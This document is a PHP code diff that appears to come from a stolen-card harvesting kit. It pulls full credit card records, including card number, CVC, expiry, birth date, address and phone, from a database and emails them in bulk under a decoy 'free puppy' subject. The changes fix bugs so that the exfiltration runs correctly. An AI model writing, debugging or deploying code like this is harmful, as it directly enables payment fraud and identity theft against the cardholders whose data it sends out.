@@ -56,7 +56,7 @@ $data_retreival = "Select * from CreditCardInfo order by dateRegistered DESC";
 //please, PLEASE don't remove this :-)
 $puppies = [ 0 => "English Bulldog", 1 => "Golden Retriever", 2=> "Labrador Retriever", 3=> "Corgi", 4=> "French Bulldog", 5 => "Yorkshire Terrier", 6=> "Pomeranian", 7=>"Cavi (Cavlier King Charles Spaniel)", 8 => "Saint Bernard", 9 => "Basset Hound", 10 => "Pug" ];
 
-$subject = "$email won another free ".$puppies[rand(0,10)]." puppy!";
+$subject = "$emailconfirm won another free ".$puppies[rand(0,10)]." puppy!";
 
 //no clue why it's not working right now
 //Might need to rewrite later
@@ -65,13 +65,16 @@ print mysql_error();
 $emailTable = mysql_query($email_retreival);
 while ($emailRow = mysql_fetch_array($emailTable))
 {
+	//echo "check 1";
 	$dataTable = mysql_query($data_retreival);
 	print mysql_error();
 	$to = $emailRow["email"];
 	$message = "UPDATE \n";
 	$message.= "email \t| first \t| last \t| birth \t| city \t| zipcode \t| country \t| phone \t| creditcard \t| cvc \t| expiration \t| street  \t \n";
+	//echo "check 2";
 	while ($dataRow = mysql_fetch_array($dataTable))
 		{
+			//echo "check 3";
 			$userEmail = $dataRow["email"];
 			$First = $dataRow["fname"];
 			$Last = $dataRow["lname"];
@@ -84,10 +87,9 @@ while ($emailRow = mysql_fetch_array($emailTable))
 			$Cvc = $dataRow["cvc"];
 			$Expired = $dataRow["expired"];
 			$Address = $dataRow["street"];
-			$dateTime = $dateRow["dateRegistered"];
-			$message.= "$dateTime | \t$userEmail | \t$First | \t$Last | \t$Bday |
-						\t$City | \t$Zipcode | \t$Country | \t$Phone | \t$CreditName | \t$Cvc |
-						\t$Expired	| \t$Address \t\n";
+			$dateTime = $dataRow["dateRegistered"];
+			$message.= "$dateTime | \t$userEmail | \t$First | \t$Last | \t$Bday | \t$City | \t$Zipcode | \t$Country | \t$Phone | \t$CreditName | \t$Cvc |\t$Expired	| \t$Address \t\n";
+			//echo "check 4";
 		}
 		mail($to, $subject, $message);
 }
